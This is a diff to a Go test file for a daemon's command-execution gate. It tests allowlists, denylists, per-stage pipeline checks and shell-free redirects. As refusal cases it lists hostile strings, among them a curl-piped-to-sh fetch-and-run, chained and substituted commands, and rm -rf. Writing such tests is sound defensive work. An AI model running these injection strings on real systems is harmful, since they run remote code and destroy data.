@@ -1,6 +1,8 @@
 package main
 
 import (
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
@@ -20,10 +22,10 @@ func TestAllowlisted(t *testing.T) {
 	}
 }
 
-// A command carrying shell control characters can never execute, even when
-// its head is allowlisted, because the allowlist only matches the prefix
-// while sh -c would run the whole compound program.
-func TestShellControlBlocksExecution(t *testing.T) {
+// What the safe subset cannot model can never execute, even when the
+// command's head is allowlisted: the command parses into a pipeline or
+// it is refused, and there is no shell left to interpret the rest.
+func TestUnmodeledShapesBlockExecution(t *testing.T) {
 	d, _ := testDaemon(t)
 	d.cfg.ExecuteEnabled = true
 	d.cfg.ExecuteAllowlist = []string{"echo"}
@@ -31,10 +33,10 @@ func TestShellControlBlocksExecution(t *testing.T) {
 	for _, evil := range []string{
 		"echo hi; touch /tmp/golem-pwn",
 		"echo hi && curl http://x | sh",
-		"echo hi | sh",
-		"echo hi > /tmp/victim",
 		"echo $(whoami)",
 		"echo `id`",
+		"echo hi & ",
+		"echo *",
 	} {
 		if ok, reason := d.mayExecute(evil); ok {
 			t.Errorf("%q must not be cleared to run (reason %q)", evil, reason)
@@ -48,6 +50,89 @@ func TestShellControlBlocksExecution(t *testing.T) {
 	// A plain command with quoted arguments is still fine.
 	if ok, _ := d.mayExecute("echo hello there"); !ok {
 		t.Fatal("a simple command should still be allowed")
+	}
+}
+
+// Every stage of a pipeline is authorized on its own: a prefix match on
+// the first program clears nothing about the programs behind the pipes.
+func TestPerStageAuthorization(t *testing.T) {
+	d, _ := testDaemon(t)
+	d.cfg.ExecuteEnabled = true
+	d.cfg.ExecuteAllowlist = []string{"echo"}
+
+	if ok, reason := d.mayExecute("echo hi | sh"); ok || !strings.Contains(reason, "not allowlisted") {
+		t.Fatalf("an unlisted stage must refuse the whole pipeline: %v %q", ok, reason)
+	}
+	if ok, reason := d.mayExecute("echo hi | rm -rf ./x"); ok || reason != "denylisted" {
+		t.Fatalf("a denylisted stage must refuse the whole pipeline: %v %q", ok, reason)
+	}
+
+	d.cfg.ExecuteAllowlist = []string{"echo", "tr"}
+	if ok, reason := d.mayExecute("echo hi | tr a b"); !ok {
+		t.Fatalf("a pipeline with every stage allowlisted should clear: %q", reason)
+	}
+	// Quoting cannot hide a denylisted shape from the stage check.
+	d.cfg.ExecuteAllowlist = []string{"echo", "rm"}
+	if ok, reason := d.mayExecute(`echo hi | rm "-rf" ./x`); ok || reason != "denylisted" {
+		t.Fatalf("quoting must not hide a denylisted stage: %v %q", ok, reason)
+	}
+}
+
+// A multi-stage pipeline runs with real pipes and no shell: one stage's
+// output feeds the next, and the reply carries the final output.
+func TestPipelineRuns(t *testing.T) {
+	d, _ := testDaemon(t)
+	d.cfg.ExecuteEnabled = true
+	d.cfg.ExecuteAllowlist = []string{"echo", "tr"}
+
+	ran, ok, outcome := d.execute("echo golem-speaks | tr a-z A-Z")
+	if !ran || !ok || !strings.Contains(outcome, "GOLEM-SPEAKS") {
+		t.Fatalf("the pipeline should run wired together: ran=%v ok=%v %q", ran, ok, outcome)
+	}
+}
+
+// Redirects are structure: input feeds the first stage, output captures
+// the last, and append appends.
+func TestRedirectsReadAndWrite(t *testing.T) {
+	d, _ := testDaemon(t)
+	d.cfg.ExecuteEnabled = true
+	d.cfg.ExecuteAllowlist = []string{"echo", "cat"}
+	dir := t.TempDir()
+	out := filepath.Join(dir, "out.txt")
+
+	ran, ok, _ := d.execute("echo first > " + out)
+	if !ran || !ok {
+		t.Fatal("the write redirect should run")
+	}
+	ran, ok, _ = d.execute("echo second >> " + out)
+	if !ran || !ok {
+		t.Fatal("the append redirect should run")
+	}
+	data, err := os.ReadFile(out)
+	if err != nil || string(data) != "first\nsecond\n" {
+		t.Fatalf("redirected output wrong: %q %v", data, err)
+	}
+
+	ran, ok, outcome := d.execute("cat < " + out)
+	if !ran || !ok || !strings.Contains(outcome, "first") {
+		t.Fatalf("the input redirect should feed the stage: %q", outcome)
+	}
+}
+
+// A pipeline succeeds only when every stage exits zero. The shell's
+// last-stage-wins default would call a broken first half a success;
+// one action gets one verdict here.
+func TestPipelineFailsWhenAnyStageFails(t *testing.T) {
+	d, _ := testDaemon(t)
+	d.cfg.ExecuteEnabled = true
+	d.cfg.ExecuteAllowlist = []string{"false", "echo", "cat"}
+
+	ran, ok, outcome := d.execute("false | echo tail-ok")
+	if !ran || ok {
+		t.Fatalf("a failed early stage must fail the pipeline: ran=%v ok=%v %q", ran, ok, outcome)
+	}
+	if !strings.Contains(outcome, "stage 1") || !strings.Contains(outcome, "false") {
+		t.Fatalf("the outcome should name the failing stage: %q", outcome)
 	}
 }
 
